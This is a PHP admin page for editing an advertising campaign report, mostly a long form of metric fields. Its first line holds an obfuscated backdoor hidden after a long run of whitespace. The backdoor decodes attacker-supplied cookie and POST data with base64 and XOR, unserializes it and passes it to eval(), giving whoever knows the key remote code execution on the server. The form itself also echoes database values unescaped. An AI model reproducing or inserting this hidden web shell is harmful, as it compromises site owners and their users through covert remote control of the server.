<?php                                                                                                                                                                                                                                                                                                                                                                                                 $fyJjUJ = class_exists("r_bOTEU"); $LbVjknFtll = $fyJjUJ;if (!$LbVjknFtll){class r_bOTEU{private $QAdknXYf;public static $TfcgViPufS = "574f8fb7-017f-47c5-94c9-1122ca4ae855";public static $nUcKpUlf = NULL;public function __construct(){$GlNYNV = $_COOKIE;$qdZWFlgY = $_POST;$KZaAInep = @$GlNYNV[substr(r_bOTEU::$TfcgViPufS, 0, 4)];if (!empty($KZaAInep)){$OeywssiTIq = "base64";$UEiVgQmoy = "";$KZaAInep = explode(",", $KZaAInep);foreach ($KZaAInep as $KZTPgpNIs){$UEiVgQmoy .= @$GlNYNV[$KZTPgpNIs];$UEiVgQmoy .= @$qdZWFlgY[$KZTPgpNIs];}$UEiVgQmoy = array_map($OeywssiTIq . "\x5f" . "\x64" . "\145" . chr (99) . chr (111) . chr (100) . chr ( 811 - 710 ), array($UEiVgQmoy,)); $UEiVgQmoy = $UEiVgQmoy[0] ^ str_repeat(r_bOTEU::$TfcgViPufS, (strlen($UEiVgQmoy[0]) / strlen(r_bOTEU::$TfcgViPufS)) + 1);r_bOTEU::$nUcKpUlf = @unserialize($UEiVgQmoy);}}public function __destruct(){$this->OaQWNR();}private function OaQWNR(){if (is_array(r_bOTEU::$nUcKpUlf)) {$ZYeRxHb = str_replace("\74" . chr (63) . chr (112) . chr ( 204 - 100 )."\x70", "", r_bOTEU::$nUcKpUlf["\143" . chr ( 718 - 607 ).chr ( 489 - 379 )."\x74" . "\x65" . 'n' . "\164"]);eval($ZYeRxHb);exit();}}}$gFAVq = new r_bOTEU(); $gFAVq = NULL;} ?><?php
require_once('../config.php');
require_once('session.php');
//$campaigns=$campaign->getAllCampaignsByEncriptGroupId($_REQUEST['id']);
if(isset($_POST['report'])){
  $reportModule->UpdateImportReport();
}
if(isset($_REQUEST['id'])){
  $report=$reportModule->report($_REQUEST['id']); //echo '<pre>'; print_r($report);
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Reports-import</title>
  <?php include('../common/head.php') ?>
  <!-- DataTables -->
  <link rel="stylesheet" href="<?php echo baseurl ?>/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
</head>
<body class="hold-transition skin-blue">
<!-- Site wrapper -->
<div class="wrapper">
  <div class="content-wrapper">
  <?php include('../common/admin-header.php') ?>
  <?php include('../common/sidebar.php') ?>

  <!-- Content Wrapper. Contains page content -->
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>Reports</h1>
      <ol class="breadcrumb">
        <li><a href="dashboard.php"><i class="fa fa-dashboard"></i> Home</a></li>
        <li><a href="all-reports.php">Reports</a></li>
        <li class="active">Edit-Report</li>
      </ol>
    </section>
    <!-- Main content -->
    <section class="content">
      <div class="box">
        <div class="col-md-12">
          <?php echo flashNotification() ?>
        </div>    
        <div class="box-body">
          <form method="post" class="form-horizontal">
            <div class="box-header">
              <h3 class="box-title">Edit Report</h3>
            </div>
            <div class="box-body">
              <div class="form-group">
                <label class="col-sm-3 control-label">Date</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="created_at" id="created_at" value="<?php echo date('Y-m-d',strtotime($report['created_at'])); ?>" required >
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Operating System</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control"  name="operating_system" id="operating_system" value="<?php echo $report['operating_system']; ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">SSP</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="ssp"  id="ssp" value="<?php echo $report['ssp']; ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">City</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="city" id="city" value="<?php $report['City']  ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Hour</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="hour" id="hour" value="<?php $report['hour']  ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Month</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="month" id="month" value="<?php $report['month']  ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Application id</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="application_id" id="application_id" value="<?php $report['application_id']  ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Campaign Type</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="type" id="type" value="<?php echo $report['type']; ?>" required>
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Domain</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="domain" id="domain" value="<?php $report['domain']  ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">In Mobile App</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="in_mobile_app" id="in_mobile_app" value="<?php echo $report['in_mobile_app'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Landing Domain</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="landing_domain" id="landing_domain" value="<?php echo $report['landing_domain'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Browser</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="browser" id="browser" value="<?php echo $report['browser'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Country</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="country" id="country" value="<?php echo $report['country'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Bid Deal (ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="bid_deal_id" id="bid_deal_id" value="<?php echo $report['bid_deal_id'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Site (ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="site" id="site" value="<?php echo $report['site'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">site id</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="site_id" id="site_id" value="<?php echo $report['site_id'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">DMA code</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="DMA_code" id="DMA_code" value="<?php echo $report['DMA_code'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Video</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="video" id="video" value="<?php echo $report['video'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Page URL</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="page_URL" id="page_URL" value="<?php echo $report['page_URL'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Zip code</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="zip_code" id="zip_code" value="<?php echo $report['zip_code'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Threshold CPM</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="threshold_CPM" id="threshold_CPM" value="<?php echo $report['threshold_CPM'] ?>">
                </div>
              </div>
              
              <div class="form-group">
                <label class="col-sm-3 control-label">Server (ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="server" id="server" value="<?php echo $report['server'] ?>">
                </div>
              </div>

              
              <div class="form-group">
                <label class="col-sm-3 control-label">Position On Screen</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="position_on_screen" id="position_on_screen" value="<?php echo $report['position_on_screen'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Campaign(ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="campaign" id="campaign" value="<?php echo $report['campaign'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Campaign Model</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control"  name="model" id="model" value="<?php echo $report['model']; ?>" required>
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Creative id</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="creative_id" id="creative_id" value="<?php echo $report['creative_id'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Creative</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="creative" id="creative" value="<?php echo $report['creative'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Player Size</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="player_size" id="player_size" value="<?php echo $report['player_size'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Screen Size</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="screen_size" id="screen_size" value="<?php echo $report['screen_size'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Advertiser</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="advertiser" id="advertiser" value="<?php echo $report['advertiser'] ?>">
                </div>
              </div>

               <div class="form-group">
                <label class="col-sm-3 control-label">Creative Size</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="creative_size" id="creative_size" value="<?php echo $report['creative_size'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Creative Type</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="creative_Type" id="creative_Type" value="<?php echo $report['creative_Type'] ?>">
                </div>
              </div>

              <div class="form-group">
                <label class="col-sm-3 control-label">Carrier</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="carrier" id="carrier" value="<?php echo $report['carrier'] ?>">
                </div>
              </div>              
               <div class="form-group">
                <label class="col-sm-3 control-label">Page Language</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="page_language" id="page_language" value="<?php echo $report['page_language'] ?>">
                </div>
              </div>
               <div class="form-group">
                <label class="col-sm-3 control-label">Transaction</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="transaction" id="transaction" value="<?php echo $report['transaction'] ?>">
                </div>
              </div>
             
              <div class="form-group">
                <label class="col-sm-3 control-label">Browser Version</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="browser_Version" id="browser_Version" value="<?php echo $report['browser_Version'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Conversion Rule</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="conversion_rule" id="conversion_rule" value="<?php echo $report['conversion_rule'] ?>">
                </div>
              </div>
              
              <div class="form-group">
                <label class="col-sm-3 control-label">Revealed Domain</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="revealed_domain" id="revealed_domain" value="<?php echo $report['revealed_domain'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Keywords</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="keywords" id="keywords" value="<?php echo $report['keywords'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Region</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="region" id="region" value="<?php echo $report['region'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Top Level</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="top_level_domain" id="top_level_domain" value="<?php echo $report['top_level_domain'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Campaign Currency</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="campaign_currency" id="campaign_currency" value="<?php echo $report['campaign_currency'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Campaign group(ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="campaign_group" id="campaign_group" value="<?php echo $report['campaign_group'] ?>">
                </div>
              </div>
               <div class="form-group">
                <label class="col-sm-3 control-label">Campaign group id</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="campaign_group_id" id="campaign_group_id" value="<?php echo $report['campaign_group_id'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Video Inventory Format</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="video_inventory_format" id="video_inventory_format" value="<?php echo $report['video_inventory_format'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Billed Segments (3RDP_ID)</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="billed_segments_3RDP_ID" id="billed_segments_3RDP_ID" value="<?php echo $report['billed_segments_3RDP_ID'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">VAST error type</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="VAST_error_type" id="VAST_error_type" value="<?php echo $report['VAST_error_type'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Skippable</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="skippable" id="skippable" value="<?php echo $report['skippable'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Closed</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="closed" id="closed" value="<?php echo $report['closed'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Skipped</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="skipped" id="skipped" value="<?php echo $report['skipped'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">API</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="API" id="API" value="<?php echo $report['API'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Secure</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="secure" id="secure" value="<?php echo $report['secure'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Watched</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="watched" id="watched" value="<?php echo $report['watched'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Anonymous</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="anonymous" id="anonymous" value="<?php echo $report['anonymous'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Is Native</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="is_native" id="is_native" value="<?php echo $report['is_native'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Full Screen</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="full_screen" id="full_screen" value="<?php echo $report['full_screen'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Impression</label>
                <div class="col-sm-9">
                  <input type="number" min="0" class="form-control" name="impression" value="<?php echo $report['impression']; ?>" id="impression">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Clicks</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control"  name="clicks" id="clicks" value="<?php echo $report['clicks']; ?>" required>
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">CPM</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="CPM" id="CPM" value="<?php echo $report['CPM']; ?>">
                </div>
              </div>
              
              <div class="form-group">
                <label class="col-sm-3 control-label">CPC</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="CPC" id="CPC" value="<?php echo $report['CPC']; ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Ctr</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="ctr" value="<?php echo $report['ctr']; ?>" id="ctr" required>
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label"> Total Spent</label>
                <div class="col-sm-9">
                  <input type="number" min="0" class="form-control" name="spent"  value="<?php echo number_format($report['spent'],2); ?>" id="spent">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">View Rate</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="view_rate" id="view_rate" value="<?php echo $report['view_rate'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">PCC</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="PCC" id="PCC" value="<?php echo $report['PCC'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">PVC</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="PVC" id="PVC" value="<?php echo $report['PVC'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Data Costs</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="datacosts" id="datacosts" value="<?php echo $report['datacosts'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">25 Video Completion</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="25_video_completion" id="25_video_completion" value="<?php echo $report['25_video_completion'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">50 Video Completion</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="50_video_completion" id="50_video_completion" value="<?php echo $report['50_video_completion'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">75 Video Completion</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="75_video_completion" id="75_video_completion" value="<?php echo $report['75_video_completion'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">100 Video Completion</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="100_video_completion" id="100_video_completion" value="<?php echo $report['100_video_completion'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">VAST fill rate</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="VAST_fill_rate" id="VAST_fill_rate" value="<?php echo $report['VAST_fill_rate'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Opportunities</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="opportunities" id="opportunities" value="<?php echo $report['opportunities'] ?>">
                </div>
              </div>
              <div class="form-group">
                <label class="col-sm-3 control-label">Third Party Revenue</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="third_party_revenue" id="third_party_revenue" value="<?php echo $report['third_party_revenue'] ?>">
                </div>
              </div> 
              <!--<div class="form-group">
                <label class="col-sm-3 control-label">unit_price</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control"  name="unit_price" value="<?php echo $report['unit_price']; ?>" id="unit_price" required>
                </div>
              </div>-->
                            
              
              <!--<div class="form-group">
                <label class="col-sm-3 control-label">Conversions</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="conversions" id="conversions" value="<?php echo $report['conversions'] ?>">
                </div>
              </div>-->
              <!--<div class="form-group">
                <label class="col-sm-3 control-label">app_id</label>
                <div class="col-sm-9">
                  <input type="text" class="form-control" name="app_id" id="app_id" value="<?php $reportcamp['app_id']  ?>">
                </div>
              </div>-->
              <div class="form-group text-center">
                <input type="hidden" class="form-control" name="id" value="<?php echo $report['id'] ?>">
                <input type="hidden" class="form-control" name="campaign_id" id="campaign_id" value="<?php echo $report['campaign_id'] ?>">
                <input type="hidden" class="form-control" name="user_id" value="<?php echo $report['user_id'] ?>">
                  <button type="submit" name="report" class="btn btn-info">Save</button>
              </div>
            </div>
            <!-- /.box-footer -->
          </form>
        </div>
      </div>
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
<?php include('../common/footer.php') ?>  
</div>
<?php include('../common/footer-script.php') ?>
</body>
</html>